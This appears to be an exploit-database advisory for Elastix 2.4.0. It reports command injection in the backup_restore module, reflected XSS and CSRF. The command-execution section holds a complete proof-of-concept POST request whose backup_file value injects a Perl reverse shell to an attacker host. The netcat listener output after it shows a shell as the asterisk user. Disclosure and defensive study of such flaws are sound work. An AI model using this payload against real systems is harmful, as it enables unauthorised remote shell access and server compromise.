@@ -1,0 +1,98 @@
+id: 22766
+date: 10/17/2014
+title: Elastix 2.4.0 Stable XSS / CSRF / Command Execution Vulnerability
+author: Simo Ben
+cves: 
+
+Title: Elastix Multiple vulnerabilities (Remote Command Execution, XSS, CSRF)
+Author: Simo Ben youssef
+Contact: Simo_at_Morxploit_com
+Discovered: September 1 2014
+Published: October 17 2014
+MorXploit Research
+http://www.MorXploit.com
+Software: Elastix
+Version: Elastix 2.4.0 Stable
+Vendor url: http://elastix.org/
+Vulnerable file: modules/backup_restore/index.php
+
+Description:
+
+1- Remote Command Execution
+
+modules/backup_restore/index.php suffers from a command execution vulnerability, allowing an authenticated Elastix user to inject commands as the asterisk user.
+
+Vulnerable code: 
+
+$archivo_post = isset($_POST["backup_file"])?$_POST["backup_file"]:"";  
+$dir_respaldo = "$path_backup";  
+$comando="cd $dir_respaldo; tar xvf $dir_respaldo/$archivo_post backup/a_options.xml";  
+exec($comando,$output,$retval);
+
+As you can see, input sent through the backup_file HTTP POST parameter is not validated/sanitized before being passed to exec();
+
+PoC:
+
+POST /index.php?menu=backup_restore
+Host: 10.0.0.14
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.0.0.14/index.php?menu=backup_restore
+Cookie: elastixSession=slt4ad92gg29vq5b4kjo29m9a1
+Connection: keep-alive
+
+Content-Type: multipart/form-data; boundary=---------------------------85835002613497174291001748681
+Content-Length: 832
+
+-----------------------------85835002613497174291001748681
+Content-Disposition: form-data; name="process"
+
+Process
+-----------------------------85835002613497174291001748681
+Content-Disposition: form-data; name="option_url"
+
+restore
+-----------------------------85835002613497174291001748681
+Content-Disposition: form-data; name="backup_file"
+
+; perl -e '$p=fork;exit,if($p); use Socket; use FileHandle; my $system = "/bin/sh"; my $host = "10.0.0.2"; my $port = "1111";socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp")); connect(SOCKET, sockaddr_in($port, inet_aton($host))); SOCKET->autoflush(); open(STDIN, ">&SOCKET"); open(STDOUT,">&SOCKET"); open(STDERR,">&SOCKET"); print "[+] Et voila you are in!
+
+"; system("uname -a;id"); system($system);'
+-----------------------------85835002613497174291001748681--
+
+root@MorXploit:/home/simo/morx/elastix# nc -lvp 1111
+Listening on [0.0.0.0] (family 0, port 1111)
+Connection from [10.0.0.14] port 1111 [tcp/*] accepted (family 2, sport 49064)
+[+] Et voila you are in!
+
+Linux localhost.localdomain 2.6.18-348.1.1.el5 #1 SMP Tue Jan 22 16:24:03 EST 2013 i686 i686 i386 GNU/Linux
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+
+2- Reflected Cross-Site Scripting:
+
+Input sent through the backup_file parameter is returned to the user without being validated/sanitized, an attacker can exploit this to steal an Elastix authenticated user's session cookie, gain full access to their account and use the previous RCE vulnerability to execute commands/gain shell access to the server
+
+3- CSRF
+
+Additionally an attacker can also exploit the RCE through CSRF by having an authenticated Elastix user visit a crafted page.
+
+
+Disclosure time-line:
+
+Initial contact on September 2nd 2014
+No response
+Second contact on September 22nd 2014
+No response
+Public disclosure on October 17th
+
+Mitigation:
+Validate/Sanitize $archivo
+Use authentication tokens for CSRF
+
+Author disclaimer:
+The information contained in this entire document is for educational, demonstration and testing purposes only.
+Author cannot be held responsible for any malicious use or damage. Use at your own risk.
+
+#  0day.today [2023-03-25]  #
